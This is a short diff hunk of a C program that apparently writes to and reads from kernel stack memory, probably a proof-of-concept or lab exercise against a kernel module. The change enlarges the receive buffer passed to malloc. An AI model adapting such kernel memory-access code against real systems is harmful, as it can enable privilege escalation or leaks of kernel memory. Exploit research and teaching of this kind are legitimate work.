@@ -43,7 +43,7 @@ int main(){
 		printf("[+] Successfully written to kernel stack\n");
 	}
 
-	read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + sizeof(char*));
+	read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG);
 	receiver->size = 300;
 
 	printf("[+] Trying to read from kernel stack...\n");
